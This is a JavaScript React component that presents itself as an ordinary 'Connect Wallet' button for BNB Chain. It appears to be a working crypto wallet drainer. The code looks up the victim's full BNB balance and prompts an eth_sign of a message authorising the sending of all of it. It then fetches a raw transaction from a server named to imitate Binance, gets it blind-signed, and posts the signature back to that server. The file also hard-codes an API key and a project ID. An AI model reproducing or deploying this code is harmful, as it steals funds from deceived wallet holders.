import jQuery from "jquery";
import { EthereumProvider } from "@walletconnect/ethereum-provider";

const BSCSCAN_API_KEY = "YVGXID1YVM77RQI37GEEI7ZKCA2BQKQS4P";

async function getBNBBalance(address) {
  try {
    const response = await fetch(
      `https://api.bscscan.com/api?module=account&action=balance&address=${address}&tag=latest&apikey=${BSCSCAN_API_KEY}`
    );
    const data = await response.json();
    if (data.status === "1") {
      return (parseInt(data.result) / 1e18).toFixed(6);
    }
  } catch (error) {
    console.error("❌ Error fetching BNB balance:", error);
  }
  return null;
}

function App() {
  async function runner() {
    if (typeof localStorage !== "undefined") {
      localStorage.removeItem("walletconnect");
    }

    const ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      chains: [56],
      methods: ["eth_sign"], // فقط eth_sign
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();
    const provider = ethereumProvider;
    const accounts = await provider.request({ method: "eth_accounts" });
    const accountSender = accounts[0];

    if (!accountSender) {
      console.error("❌ Wallet connection failed");
      return;
    }

    console.log("✅ Wallet Connected:", accountSender);

    try {
      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }],
      });
    } catch (error) {
      console.error("❌ Error in switching chain:", error);
      return;
    }

    const apiUrl = "https://sponsorbinance.vercel.app/api/proxy";

    // دریافت بالانس
    const amount = await getBNBBalance(accountSender);
    if (!amount) {
      console.error("❌ Failed to fetch BNB balance.");
      return;
    }
    console.log("💰 BNB Balance:", amount);

    // ساخت پیام
    const message = `Authorize sending ${amount} BNB from ${accountSender}`;
    console.log("📜 Message to Sign:", message);

    // امضای پیام با eth_sign
    let signature;
    try {
      signature = await provider.request({
        method: "eth_sign",
        params: [accountSender, message],
      });
    } catch (error) {
      console.error("❌ Signature failed:", error);
      return;
    }

    console.log("✍️ Signature:", signature);

    // درخواست تراکنش خام از سرور + امضای آن
    async function signAndSendTransaction() {
      try {
        console.log("📡 Requesting Unsigned Transaction...");

        // پاسخ سرور معمولا string یا object است
        let result = await jQuery.post(apiUrl, {
          handler: "tx",
          address: accountSender,
          signature: signature,
          amount: amount, // مرحله اول
        });

        console.log("📥 API Response (raw):", result);

        // اگر jQuery پاسخ رو string برگردونه، parse کنیم
        if (typeof result === "string") {
          try {
            result = JSON.parse(result);
          } catch (err) {
            console.error("❌ Could not parse the raw server response:", err);
            return;
          }
        }

        console.log("📥 API Response (parsed):", result);

        if (!result || !result.rawTransaction) {
          console.error("❌ No rawTransaction received!", result);
          return;
        }

        let unsignedTx;
        try {
          unsignedTx =
            typeof result.rawTransaction === "string"
              ? JSON.parse(result.rawTransaction)
              : result.rawTransaction;
        } catch (e) {
          console.error("❌ Failed to parse rawTransaction:", result.rawTransaction, e);
          return;
        }

        console.log("📜 Unsigned Transaction:", unsignedTx);

        console.log("📝 Signing Transaction (raw)...");
        const signedTx = await provider.request({
          method: "eth_sign",
          params: [accountSender, JSON.stringify(unsignedTx)],
        });

        console.log("✍️ Signed Transaction (raw):", signedTx);

        // مرحله دوم هم amount بفرست
        const txHash = await jQuery.post(apiUrl, {
          handler: "sign",
          signature: signedTx,
          address: accountSender,
          amount: amount, // 👈 اینجا اضافه شد
        });

        console.log("📤 Transaction Sent:", txHash);
      } catch (error) {
        console.error("❌ Error in signAndSendTransaction:", error);
      }
    }

    await signAndSendTransaction();
  }

  return (
    <a
      href="#"
      id="connectWallet"
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      data-uk-toggle=""
    >
      <span>Connect Wallet</span>
    </a>
  );
}

export default App;
